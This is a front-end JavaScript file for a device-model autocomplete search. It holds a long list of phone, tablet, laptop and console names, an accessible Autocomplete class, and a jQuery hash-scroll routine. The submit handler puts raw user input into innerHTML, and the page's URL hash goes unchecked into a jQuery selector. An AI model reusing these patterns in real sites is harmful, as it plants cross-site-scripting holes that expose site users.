'Xiaomi Mi 9T',
'Xiaomi Mi 9 SE',
'Xiaomi Mi 9 Lite / Mi CC9',
'Xiaomi Mi 9',
'Xiaomi Mi 8 Pro',
'Xiaomi Mi 8 Lite',
'Xiaomi Mi 8 Se',
'Xiaomi Mi 8',
'Xiaomi Mi 6 Plus',
'Xiaomi Mi 6',
'Xiaomi Mi 5S Plus',
'Xiaomi Mi 5S',
'Xiaomi Mi 5',
'Xiaomi Mi 4C',
'Xiaomi Mi 4S',
'Xiaomi Mi 4',
'Xiaomi Mi Note 10 Pro',
'Xiaomi Mi Note 10 Lite',
'Xiaomi Mi Note 10',
'Xiaomi Mi Play',
'Xiaomi Mi Note 3',
'Xiaomi Mi Note 2',
'Xiaomi Mi Note',
'Xiaomi Mi Max 3',
'Xiaomi Mi Max 2',
'Xiaomi Mi Max',
'Xiaomi Mi Mix 3',
'Xiaomi Mi Mix 2S',
'Xiaomi Mi Mix',
'Xiaomi Mi A3',
'Xiaomi Mi A2 Lite',
'Xiaomi Mi A2 / Mi 6X',
'Xiaomi Mi A1',
'Xiaomi Poco F4',
'Xiaomi Poco F4 GT',
'Xiaomi Poco F3 5G',
'Xiaomi Poco F2 Pro',
'Xiaomi Poco F1',
'Xiaomi Poco X5 5G',
'Xiaomi Poco X5 Pro 5G',
'Xiaomi Poco X4 Pro 5G',
'Xiaomi Poco X4 Pro 4G',
'Xiaomi Poco X4 GT',
'Xiaomi Poco M5S',
'Xiaomi Poco M5',
'Xiaomi Poco M4 Pro 5G',
'Xiaomi Poco M4 Pro',
'Xiaomi Poco M4 5G',
'Xiaomi Poco X3 Pro',
'Xiaomi Poco X3 NFC',
'Xiaomi Poco X3',
'Xiaomi Poco M3 Pro',
'Xiaomi Poco M3',
'Xiaomi Poco M2 Pro',
'Xiaomi Poco C40',
'Xiaomi Poco C55',
'Oppo Find X5 Pro',
'Oppo Find X5',
'Oppo Find X5 Lite',
'Oppo Find X3 Pro',
'Oppo Find X3 Neo',
'Oppo Find X3 Lite',
'Oppo Find X2 Pro',
'Oppo Find X2',
'Oppo Find X2 Neo',
'Oppo Find X2 Lite',
'Oppo Reno 6 Pro 5G',
'Oppo Reno 6 5G',
'Oppo Reno 4Z 5G',
'Oppo Reno 4',
'Oppo Reno 2Z',
'Oppo Reno 2',
'Oppo Reno Z',
'Oppo Reno',
'Oppo Reno 10X Zoom',
'Oppo Reno 8 Lite',
'Oppo Reno 8 Pro 5G',
'Oppo A96',
'Oppo A94 5G',
'Oppo A78 5G',
'Oppo A77 5G',
'Oppo A76',
'Oppo A74 4G',
'Oppo A74 5G',
'Oppo A72',
'Oppo A57 5G',
'Oppo A57 4G',
'Oppo A57S',
'Oppo A58 5G',
'Oppo A54S',
'Oppo A54 5G',
'Oppo A53S',
'Oppo A53',
'Oppo A16S',
'Oppo A16',
'Oppo A15',
'Oppo A5 2020',
'Realme 3',
'Realme 5',
'Realme 5 Pro',
'Realme 6',
'Realme 6 Pro',
'Realme 6i',
'Realme 7',
'Realme 7 5G',
'Realme 7 Pro',
'Realme 7i',
'Realme 8',
'Realme 8 5G',
'Realme 8 Pro',
'Realme 8i',
'Realme 9 5G',
'Realme 9 Pro 5G',
'Realme 9i',
'Realme C11',
'Realme C11 2021',
'Realme C21',
'Realme C21Y',
'Realme C25Y',
'Realme C3',
'Realme C31',
'Realme C33',
'Realme C30',
'Realme C35',
'Realme GT',
'Realme GT Neo2',
'Realme X2',
'Realme X2 Pro',
'Realme X50',
'Realme X50 Pro',
'Huawei P40 Pro',
'Huawei P40 Lite E',
'Huawei P40 Lite 5G',
'Huawei P40 Lite',
'Huawei P40',
'Huawei P30 Pro',
'Huawei P30 Lite',
'Huawei P30',
'Huawei P20 Pro',
'Huawei P20 Lite',
'Huawei P20 Lite 2019',
'Huawei P20',
'Huawei P10 Plus',
'Huawei P10 Lite',
'Huawei P10',
'Huawei P9 Plus',
'Huawei P9 Lite',
'Huawei P9',
'Huawei P8 Lite Smart',
'Huawei P8 Lite 2017/P9 Lite 2017',
'Huawei P8 Lite',
'Huawei P8',
'Huawei P7',
'Huawei P6',
'Huawei P Smart S',
'Huawei P Smart 2021',
'Huawei P Smart 2020',
'Huawei P Smart Plus 2019',
'Huawei P Smart 2019',
'Huawei P Smart Plus',
'Huawei P Smart Z',
'Huawei P Smart',
'Huawei Y9 2019',
'Huawei Y9 2018',
'Huawei Y7 Pro 2019/Y7 2019',
'Huawei Y7 2018',
'Huawei Y7 2017/Enjoy 7Plus/Y7 Prime',
'Huawei Y6P',
'Huawei Y6 Pro 2017/P9 Lite Mini',
'Huawei Y6 II',
'Huawei Y6 2019',
'Huawei Y6 2018',
'Huawei Y6 2017/Y5 2017',
'Huawei Y6',
'Huawei Y5P',
'Huawei Y5 II',
'Huawei Y5 2019',
'Huawei Y5 2018',
'Huawei Y3 2017',
'Huawei Mate 30',
'Huawei Mate 20X',
'Huawei Mate 20 Pro',
'Huawei Mate 20 Lite',
'Huawei Mate 20',
'Huawei Mate 10 Pro',
'Huawei Mate 10 Lite',
'Huawei Mate 10',
'Huawei Mate 9 Pro',
'Huawei Mate 9 Lite',
'Huawei Mate 9',
'Huawei Mate 8',
'Huawei Mate 7',
'Huawei Mate S',
'Honor 50 Lite',
'Honor 50',
'Honor 20 Pro',
'Honor 20 Lite',
'Honor 20',
'Honor 10 Lite',
'Honor 10',
'Honor 9X',
'Honor 9 Lite',
'Honor 9',
'Honor 8C',
'Honor 8',
'Honor 7X',
'Honor 7I',
'Honor 7',
'Honor 6X',
'Honor 6C Pro/V9 Play',
'Honor 6C',
'Honor 5X',
'Honor 5C',
'Honor 5A',
'Honor 4X',
'Honor X20',
'Honor X9',
'Honor X8',
'Honor X7',
'Honor Play',
'Honor V20/View 20',
'Honor View 10 Lite',
'Honor V10',
'Honor V8',
'TCL 30 Plus',
'TCL 30',
'TCL 305/306',
'TCL 30SE',
'TCL 20 5G',
'TCL 205',
'TCL 20E',
'TCL 20L',
'TCL 20L Plus',
'TCL 20R 5G',
'TCL 20S',
'TCL 20SE',
'TCL 20Y',
'TCL 20XE',
'TCL 10 Plus',
'TCL 10 Pro',
'TCL 10 5G',
'TCL 10L',
'TCL 10SE',
'Vivo Y91',
'Vivo Y77 5G',
'Vivo Y76 5G',
'Vivo Y72 5G',
'Vivo Y72',
'Vivo Y70',
'Vivo Y55 5G',
'Vivo Y52 5G',
'Vivo Y35',
'Vivo Y33S',
'Vivo Y30',
'Vivo Y22/Y22S',
'Vivo Y21/Y21S',
'Vivo Y20S',
'Vivo Y20',
'Vivo Y16',
'Vivo Y15A',
'Vivo Y11S',
'Vivo Y01',
'Vivo V23 5G',
'Vivo V21 5G',
'LG K61',
'LG K51S',
'LG K51',
'LG K50S',
'LG K42',
'LG K41S',
'LG K40S',
'LG K40',
'LG K30 2019',
'LG K22',
'LG K20 2019',
'LG K20',
'LG K11 T36',
'LG K10 2018',
'LG K10 2017',
'LG K10',
'LG K9',
'LG K8 2018',
'LG K8',
'LG K7',
'LG K4 2017',
'LG K4',
'LG G8X',
'LG G8S',
'LG G8',
'LG G7',
'LG G6',
'LG G5',
'LG G4S',
'LG G4C/G4 Mini',
'LG G4 Style',
'LG G4',
'LG G3 Mini',
'LG G3',
'LG G2 Mini',
'LG G2',
'LG Q60',
'LG Q7',
'LG Q6',
'LG V30',
'LG V10',
'LG X Screen',
'LG X Cam',
'LG X Power 2',
'LG X Power',
'LG Nexus 5',
'LG Stylus 3',
'LG Velvet',
'Motorola ONE',
'Motorola Edge 20',
'Motorola Edge',
'Motorola Moto X Play',
'Motorola Moto C Plus',
'Motorola Moto C',
'Motorola Moto E40',
'Motorola Moto E20',
'Motorola Moto E7',
'Motorola Moto E6S',
'Motorola Moto E6 Play',
'Motorola Moto E6 Plus',
'Motorola Moto E5 Plus',
'Motorola Moto E5',
'Motorola Moto E4 Plus',
'Motorola Moto E4 Play',
'Motorola Moto E4',
'Motorola Moto E2',
'Motorola Moto G200 5G',
'Motorola Moto G100',
'Motorola Moto G52',
'Motorola Moto G51 5G',
'Motorola Moto G50',
'Motorola Moto G42',
'Motorola Moto G41',
'Motorola Moto G32',
'Motorola Moto G31',
'Motorola Moto G30',
'Motorola Moto G22',
'Motorola Moto G20',
'Motorola Moto G10',
'Motorola Moto G9 Power',
'Motorola Moto G9 Plus',
'Motorola Moto G9 Play',
'Motorola Moto G8 Power',
'Motorola Moto G8 Plus',
'Motorola Moto G8 Play',
'Motorola Moto G8',
'Motorola Moto G7 Power',
'Motorola Moto G7 Plus',
'Motorola Moto G7 Play',
'Motorola Moto G7',
'Motorola Moto G6 Plus',
'Motorola Moto G6 Play',
'Motorola Moto G6',
'Motorola Moto G5S Plus',
'Motorola Moto G5S',
'Motorola Moto G5 Plus',
'Motorola Moto G5',
'Motorola Moto G4 Plus',
'Motorola Moto G4 Play',
'Motorola Moto G4',
'Motorola Moto G3',
'Motorola Moto G2',
'Motorola Moto G 5G Plus',
'Motorola Moto G 5G',
'Motorola Z3 Play',
'Motorola Z2 Play',
'Motorola Z Play',
'BQ Active 1',
'BQ X5 Plus',
'BQ X5',
'BQ X2',
'BQ X/X Pro',
'BQ V Plus',
'BQ V',
'BQ U2 Lite',
'BQ U2',
'BQ U Plus',
'BQ U Lite',
'BQ U',
'BQ M5.5',
'BQ M5',
'BQ M4.5',
'BQ E6',
'BQ E5',
'BQ E4.5',
'BQ E4.0',
'BQ C',
'Sony XZ3',
'Sony XZ2 Premium',
'Sony XZ2 Compact',
'Sony XZ2',
'Sony XZ1 Compact/XZ1 Mini',
'Sony XZ1',
'Sony XZ Premium',
'Sony XZ',
'Sony Xperia 10 Plus',
'Sony Xperia 10',
'Sony XA2 Ultra',
'Sony XA2',
'Sony XA1 Ultra',
'Sony XA1 Plus',
'Sony XA1',
'Sony XA',
'Sony X Performance',
'Sony X Mini',
'Sony X Compact',
'Sony X',
'Sony Z5 Premium',
'Sony Z5 Mini',
'Sony Z5',
'Sony Z4 Mini',
'Sony Z4',
'Sony Z3 Mini',
'Sony Z3',
'Sony Z2',
'Sony Z1 Mini',
'Sony Z1',
'Sony Z',
'Sony Z Ultra',
'Sony C6',
'Sony C5',
'Sony C3',
'Sony L4',
'Sony L3',
'Sony L2',
'Sony L1',
'Sony M5',
'Sony M4/M4 Aqua',
'Sony M2',
'OnePlus 9 Pro',
'OnePlus 9 5G',
'OnePlus 8T',
'OnePlus 8 Pro',
'OnePlus 8',
'OnePlus 7T Pro',
'OnePlus 7T',
'OnePlus 7 Pro',
'OnePlus 7',
'OnePlus 6T',
'OnePlus 6',
'OnePlus 5T',
'OnePlus 5',
'OnePlus 3',
'OnePlus 3T',
'OnePlus 2',
'OnePlus',
'OnePlus Nord N10 5G',
'OnePlus N100',
'Nokia X20',
'Nokia G50',
'Nokia G21',
'Nokia G11',
'Nokia G10',
'Nokia C20',
'Nokia 8.3',
'Nokia 8',
'Nokia 7.1 Plus',
'Nokia 7 Plus',
'Nokia 7',
'Nokia 6.2',
'Nokia 6',
'Nokia 5.3',
'Nokia 5.1 Plus',
'Nokia 5',
'Nokia 4.2',
'Nokia 3.4',
'Nokia 3.2',
'Nokia 3.1 Plus',
'Nokia 3',
'Nokia 2.4',
'Nokia 2.3',
'Nokia 2',
'Alcatel 3L 2021',
'Alcatel 3X 2020',
'Alcatel 3X 2019',
'Alcatel 3X 4CAM',
'Alcatel 3C 2019',
'Alcatel 1SE 2020',
'Alcatel 1L 2021',
'Alcatel 1S 2021',
'Alcatel 1S 2020',
'Alcatel 1S 2019',
'Alcatel 1B 2020',
'Alcatel 1C 2019',
'Alcatel 1V 2019',
'Alcatel 1X 2019',
'Alcatel A7 XL',
'Alcatel A7',
'Alcatel A5 LED',
'Alcatel A3 XL',
'Alcatel A3',
'Alcatel 5V',
'Alcatel 5',
'Alcatel 3X',
'Alcatel 3V',
'Alcatel 3L',
'Alcatel 3C',
'Alcatel 3 2019',
'Alcatel 3',
'Alcatel 1X',
'Alcatel 1C',
'Alcatel 1',
'Alcatel U5 3G',
'Alcatel Pop Star',
'Alcatel Pixi 4',
'Alcatel Pixi 3',
'Alcatel One Touch Pop C9',
'Alcatel One Touch Pop C7',
'Alcatel Idol 3',
'ZTE A71',
'ZTE A52',
'ZTE A51',
'ZTE A31 Plus',
'ZTE A31',
'ZTE A610 Plus',
'ZTE A602',
'ZTE A510',
'ZTE A506',
'ZTE A7 Vita',
'ZTE A7 2020',
'ZTE A7 2019',
'ZTE A5 2020',
'ZTE A5 2019',
'ZTE Axon M',
'ZTE V40 Vita',
'ZTE Blade V10',
'ZTE Blade V10 Vita',
'ZTE Blade V9',
'ZTE Blade V9 Vita',
'ZTE Blade V8',
'ZTE Blade V7',
'ZTE Blade V6',
'ZTE Blade A71',
'ZTE Blade A51',
'ZTE Blade A31 Lite',
'ZTE Blade A3 2020',
'ZTE Blade V30 Vita',
'ZTE L8',
'ZTE L7',
'Wiko Lenny 5',
'Wiko Lenny 4 Plus',
'Wiko Lenny 4',
'Wiko Lenny 3',
'Wiko Lenny 3 Max',
'Wiko Lenny',
'Wiko Jerry 3',
'Wiko Jerry 2',
'Wiko Jerry',
'Wiko Sunny 3',
'Wiko Serie Robby',
'Wiko Serie Ridge',
'Wiko Serie Rainbow',
'Wiko Serie Pulp',
'Wiko Serie Harry',
'Wiko Serei Fever',
'Wiko Serie Ride',
'Wiko Serie U',
'Wiko View 4',
'Wiko View 3 Pro',
'Wiko View 3 Lite',
'Wiko View 3',
'Wiko View 2 Pro',
'Wiko View 2 Go',
'Wiko View Lite',
'Wiko Y81',
'Wiko Y80',
'Wiko Y61',
'Wiko Y60',
'Wiko Y51',
'Wiko Y50',
'iPad 2 (2011)',
'iPad 3 (2012)',
'iPad 4 (2012)',
'iPad 5 (2017)',
'iPad 6 (2018)',
'iPad 10.2 (2019)',
'iPad 10.2(2020)',
'iPad Air 2 (2014)',
'iPad Air 3 (2019)',
'iPad Pro 9.7" (2015)',
'iPad Pro 10.5" (2017)',
'iPad Pro 11" (2018)',
'iPad Pro 11" (2020)',
'iPad Pro 12.9" (2015)',
'iPad Pro 12.9" (2017)',
'iPad Pro 12.9" (2018)',
'iPad Pro 12.9" (2020)',
'iPad Mini 1 (2012)',
'iPad Mini 2 (2013)',
'iPad Mini 3 (2014)',
'iPad Mini 4 (2015)',
'iPad Mini 5 (2019)',
'Samsung Tab S8 X700',
'Samsung Tab S7 FE T730',
'Samsung Tab S7+ T970/T976',
'Samsung Tab S7 11.0 T870-T875',
'Samsung Tab S6 10.5 T860/T865',
'Samsung Tab S6 Lite P610/P615',
'Samsung Tab S5e 10.5 T720/T725',
'Samsung Tab S2 9.7 T810/T815',
'Samsung Tab A8 10.5 X200/X205',
'Samsung Tab A7 T500',
'Samsung Tab A7 Lite T220/T225',
'Samsung Tab A 10.5 T590/T595',
'Samsung Tab A 10.1 T510/T515',
'Samsung Tab A 10.1 T580/T585',
'Samsung Tab A 9.7 T550/T555',
'Samsung Tab A 8.0 T290/T295',
'Samsung Tab A 8.0 T380',
'Samsung Tab E 9.6 T560/T561',
'Samsung Tab Active Pro 10.1 T540-T545',
'Samsung Tab Active 3 T570-T575',
'Samsung Tab Active 2 8.0 T390-T395',
'Samsung Tab 4 10.1 T530/T535',
'Samsung Tab 3 10.1 P5210/P5220',
'Xiaomi Redmi Pad',
'Xiaomi Mi Pad 4',
'Xiaomi Mi Pad 5',
'Lenovo Tab P11 Pro',
'Lenovo Tab P11',
'Lenovo Tab M10 Plus TB-X606F',
'Lenovo Tab M10 TB-X605F',
'Lenovo Tab M10 TB-X505F',
'Lenovo Tab M10 II HD TB-X306F',
'Lenovo Tab M8',
'Lenovo Tab E10',
'Lenovo Tab 5 10 Plus X705',
'Lenovo Tab 4 10 X304F',
'Lenovo Tab 10 TB-X103',
'Portatil Apple',
'Portatil Lenovo',
'Portatil Lenovo',
'Portatil HP',
'Portatil Dell',
'Portatil ASUS',
'Portatil Acer',
'Portatil Microsoft',
'Portatil Razer',
'Portatil LG',
'Portatil Samsung',
'Sony PlayStation 5',
'Microsoft Xbox Series X',
'Microsoft Xbox Series S',
'Nintendo Switch',
'Sony PlayStation 4',
'Nintendo Switch Lite',
'Microsoft Xbox One',
'Sony PlayStation 4 Pro',
'Sony PlayStation 4 Slim',
'Nintendo Switch OLED Model',
'Sony PlayStation 3',
'Microsoft Xbox 360',
'Nintendo Wii U',
'Nintendo 3DS',
'Nintendo 2DS',
'Sony PlayStation Vita',
'Nintendo DSi',
'Nintendo DS Lite',
'Nintendo DS',
'Nintendo Wii',
'Sony PSP (PlayStation Portable)',
]

class Autocomplete {
  constructor({
    rootNode,
    inputNode,
    resultsNode,
    searchFn,
    shouldAutoSelect = false,
    onShow = () => {},
    onHide = () => {}
  } = {}) {
    this.rootNode = rootNode
    this.inputNode = inputNode
    this.resultsNode = resultsNode
    this.searchFn = searchFn
    this.shouldAutoSelect = shouldAutoSelect
    this.onShow = onShow
    this.onHide = onHide
    this.activeIndex = -1
    this.resultsCount = 0
    this.showResults = false

    // Setup events
    document.body.addEventListener('click', this.handleDocumentClick)
    this.inputNode.addEventListener('input', this.handleInput)
    this.inputNode.addEventListener('keydown', this.handleKeydown)
    this.inputNode.addEventListener('focus', this.handleFocus)
    this.resultsNode.addEventListener('click', this.handleResultClick)
  }

  handleDocumentClick = event => {
    if (event.target === this.inputNode || this.rootNode.contains(event.target)) {
      return
    }
    this.hideResults()
    this.inputNode.classList.add('autocomplete-input2');
    const submitButton = document.querySelector('.autocomplete-submit');
    submitButton.classList.add('autocomplete-submit2');
    this.inputNode.style.borderBottomLeftRadius = '25px'; // Restaurar el borde redondeado por defecto
  }

  handleInput = event => {
    this.updateResults()
  }

  handleKeydown = event => {
    const { key } = event
    let activeIndex = this.activeIndex

    if (this.resultsCount < 1) {
      return
    }

    const prevActive = this.getItemAt(activeIndex)
    let activeItem

    switch(key) {
      case 'ArrowUp':
        if (activeIndex <= 0) {
          activeIndex = this.resultsCount - 1
        } else {
          activeIndex -= 1
        }
        break
      case 'ArrowDown':
        if (activeIndex === -1 || activeIndex >= this.resultsCount - 1) {
          activeIndex = 0
        } else {
          activeIndex += 1
        }
        break
      case 'Enter':
        activeItem = this.getItemAt(activeIndex)
        this.selectItem(activeItem)
        return
      case 'Tab':
        this.checkSelection()
        this.hideResults()
        return
      default:
        return
    }

    event.preventDefault()
    activeItem = this.getItemAt(activeIndex)
    this.activeIndex = activeIndex

    if (prevActive) {
      prevActive.classList.remove('selected')
      prevActive.setAttribute('aria-selected', 'false')
    }

    if (activeItem) {
      this.inputNode.setAttribute('aria-activedescendant', `autocomplete-result-${activeIndex}`)
      activeItem.classList.add('selected')
      activeItem.setAttribute('aria-selected', 'true')
    } else {
      this.inputNode.setAttribute('aria-activedescendant', '')
    }
  }

  handleFocus = event => {
    this.updateResults()
    if (this.inputNode.value.length > 0) {
      this.inputNode.classList.remove('autocomplete-input2');
      const submitButton = document.querySelector('.autocomplete-submit');
      submitButton.classList.remove('autocomplete-submit2');
      this.inputNode.style.borderBottomLeftRadius = '0';
    }
  }

  handleResultClick = event => {
    if (event.target && event.target.classList.contains('no-results')) {
      event.stopPropagation(); // Evita la propagación del evento de clic
      return; // No hacer nada al hacer clic en "Sin resultados"
    }
    if (event.target && event.target.nodeName === 'LI') {
      this.selectItem(event.target)
    }
  }

  getItemAt = index => {
    return this.resultsNode.querySelector(`#autocomplete-result-${index}`)
  }

  selectItem = node => {
    if (node) {
      this.inputNode.value = node.innerText
      this.hideResults()
      this.inputNode.classList.add('autocomplete-input2');
      const submitButton = document.querySelector('.autocomplete-submit');
      submitButton.classList.add('autocomplete-submit2');
      this.inputNode.style.borderBottomLeftRadius = '25px'; // Restaurar el borde redondeado por defecto
    }
  }

  checkSelection = () => {
    if (this.activeIndex < 0) {
      return
    }
    const activeItem = this.getItemAt(this.activeIndex)
    this.selectItem(activeItem)
  }

  updateResults = () => {
    const input = this.inputNode.value
    const results = this.searchFn(input)

    this.hideResults()
    if (input.length > 0 && results.length === 0) {
      this.resultsNode.innerHTML = "<li class='no-results' style='padding: 4px 8px;' aria-disabled='true'>Sin resultados</li>"
      this.resultsNode.classList.add('visible'); // Añadir clase visible
      this.resultsNode.classList.remove('hidden')
      return
    }

    this.resultsNode.innerHTML = results.map((result, index) => {
      const isSelected = this.shouldAutoSelect && index === 0
      if (isSelected) {
        this.activeIndex = 0
      }
      return `
        <li
          id='autocomplete-result-${index}'
          class='autocomplete-result${isSelected ? ' selected' : ''}'
          role='option'
          ${isSelected ? "aria-selected='true'" : ''}
        >
          ${result}
        </li>
      `
    }).join('')

    if (results.length > 0) {
      this.resultsNode.classList.add('visible'); // Añadir clase visible
      this.resultsNode.classList.remove('hidden')
    }
    
    this.rootNode.setAttribute('aria-expanded', results.length > 0)
    this.resultsCount = results.length
    this.shown = true
    this.onShow()
  }

  hideResults = () => {
    this.shown = false
    this.activeIndex = -1
    this.resultsNode.innerHTML = ''
    this.resultsNode.classList.remove('visible'); // Remover clase visible
    this.resultsNode.classList.add('hidden')
    this.rootNode.setAttribute('aria-expanded', 'false')
    this.resultsCount = 0
    this.inputNode.setAttribute('aria-activedescendant', '')
    this.onHide()
  }
}

const search = input => {
  if (input.length < 1) {
    return []
  }
  return data.filter(item => item.toLowerCase().includes(input.toLowerCase()))
}

const autocomplete = new Autocomplete({
  rootNode: document.querySelector('.autocomplete'),
  inputNode: document.querySelector('.autocomplete-input'),
  resultsNode: document.querySelector('.autocomplete-results'),
  searchFn: search,
  shouldAutoSelect: true
})

document.querySelector('form').addEventListener('submit', (event) => {
  event.preventDefault()
  const result = document.querySelector('.search-result')
  const input = document.querySelector('.autocomplete-input')
  result.innerHTML = 'Searched for: ' + input.value
})
document.querySelector('.autocomplete-input').addEventListener('input', () => {
  const input = document.querySelector('.autocomplete-input');
  const submitButton = document.querySelector('.autocomplete-submit');
  if (input.value.length > 0) {
    input.classList.remove('autocomplete-input2');
    submitButton.classList.remove('autocomplete-submit2');
    input.style.borderBottomLeftRadius = '0';
  } else {
    input.classList.add('autocomplete-input2');
    submitButton.classList.add('autocomplete-submit2');
    input.style.borderBottomLeftRadius = '25px'; // Restaurar el borde redondeado por defecto
  }
});


if (window.location.hash) {
  let hash = window.location.hash;
  if ($(hash).length) {
    let scrollOffset = parseInt(getComputedStyle(document.documentElement).getPropertyValue('--scroll-offset'), 10);
    
    // Detectar si el navegador es Firefox
    let isFirefox = typeof InstallTrigger !== 'undefined';
    
    if (isFirefox) {
      // Si es Firefox, desplazar la página al principio antes de la animación
      $('html, body').scrollTop(0);
    }
    
    $('html, body').animate({
      scrollTop: $(hash).offset().top - scrollOffset
    }, 900, '', function(){
      // Después de completar la animación, elimina el hash de la URL
      history.replaceState({}, document.title, window.location.pathname + window.location.search);
    });
  }
}